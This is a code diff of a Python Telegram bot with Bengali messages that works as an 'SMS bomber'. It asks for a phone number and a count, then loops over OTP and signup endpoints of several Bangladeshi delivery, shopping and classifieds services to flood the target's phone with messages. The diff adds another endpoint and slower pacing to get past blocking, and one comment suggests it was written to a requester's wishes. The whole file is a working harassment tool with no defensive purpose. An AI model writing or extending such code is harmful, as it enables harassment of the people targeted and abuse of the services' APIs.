@@ -15,7 +15,7 @@ verified_users = set()
 
 app = Flask('')
 @app.route('/')
-def home(): return "Power Bomber is Active!"
+def home(): return "Server is Running!"
 
 def run():
     app.run(host='0.0.0.0', port=8080)
@@ -30,16 +30,17 @@ def check_join(chat_id):
         return status in ['member', 'administrator', 'creator']
     except: return False
 
-# ২. স্টার্ট ও ভেরিফিকেশন (একবারই আসবে)
+# ২. স্টার্ট কমান্ড ও ভেরিফিকেশন (একবারই আসবে)
 @bot.message_handler(commands=['start'])
 def welcome(message):
     chat_id = message.chat.id
     if check_join(chat_id):
         if chat_id not in verified_users:
-            bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল!**")
+            bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
             verified_users.add(chat_id)
+            time.sleep(1)
         
-        msg = bot.send_message(chat_id, "🎯 SMS পাঠাতে ১১ ডিজিটের নাম্বার দিন:")
+        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন নাম্বারটি দিন (১১ ডিজিট):")
         bot.register_next_step_handler(msg, get_number)
     else:
         markup = types.InlineKeyboardMarkup()
@@ -53,7 +54,7 @@ def verify_join(call):
         bot.delete_message(call.message.chat.id, call.message.message_id)
         welcome(call.message)
     else:
-        bot.answer_callback_query(call.id, "❌ আগে জয়েন হন!", show_alert=True)
+        bot.answer_callback_query(call.id, "❌ আপনি এখনো জয়েন হননি!", show_alert=True)
 
 # ৩. কঠোর ১১ ডিজিট চেক
 def get_number(message):
@@ -61,39 +62,43 @@ def get_number(message):
     if num == "/start":
         welcome(message)
         return
+    
     if not num.isdigit() or len(num) != 11:
-        msg = bot.send_message(message.chat.id, "⚠️ ভুল! সঠিক ১১ ডিজিটের নাম্বার দিন:")
+        msg = bot.send_message(message.chat.id, "⚠️ ভুল নাম্বার! ১১ ডিজিটের সঠিক নাম্বার দিন:")
         bot.register_next_step_handler(msg, get_number)
         return
+        
     user_data[message.chat.id] = num
-    msg = bot.send_message(message.chat.id, "🔢 কয়টি SMS পাঠাবেন? (১-১০০):")
+    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান? (১-১০০):")
     bot.register_next_step_handler(msg, send_bomber)
 
-# ৪. শক্তিশালী মাল্টি-এপিআই (বিকাশ/নগদ/ব্যাংক স্টাইল)
+# ৪. বোম্বিং প্রসেস (ধীরে ধীরে SMS যাবে)
 def send_bomber(message):
     try:
         amount = int(message.text)
         num = user_data[message.chat.id]
-        if amount > 100: amount = 100
-        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS যাচ্ছে...")
+        if amount > 100: amount = 100 
+        
+        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
         
         for i in range(amount):
             try:
-                # API 1: Nagad/RedX Style
-                requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, timeout=3)
-                # API 2: Pathao
-                requests.post("https://api.pathao.com/v1/auth/otp/send", data={"phone": num}, timeout=3)
-                # API 3: Chaldal
-                requests.post("https://chaldal.com/api/customer/LoginOTP", json={"PhoneNumber": num}, timeout=3)
-                # API 4: Bikroy
-                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=3)
+                # একাধিক API সোর্স (যাতে ১০-২০টার বেশি SMS যায়)
+                requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
+                requests.post("https://api-dest.redx.com.bd/v1/user/signup", json={"phone": num}, timeout=5)
+                requests.post("https://api.pathao.com/v1/auth/otp/send", data={"phone": num}, timeout=5)
+                requests.post("https://chaldal.com/api/customer/LoginOTP", json={"PhoneNumber": num}, timeout=5)
+                requests.get(f"https://fundesh.com.bd/api/auth/send-otp?phone={num}", timeout=5)
                 
-                time.sleep(1) # ব্লক এড়াতে বিরতি
-            except: continue
+                # আপনি যেমন চেয়েছেন - ধীরে ধীরে পাঠানোর জন্য ২ সেকেন্ড বিরতি
+                time.sleep(2) 
+            except:
+                continue
                 
-        bot.send_message(message.chat.id, "✅ মিশন সফল!")
+        # আপনার পছন্দের সেই পুরনো লেখা
+        bot.send_message(message.chat.id, "✅ কাজ শেষ!")
     except:
-        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")
+        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")
 
 if __name__ == "__main__":
     keep_alive()
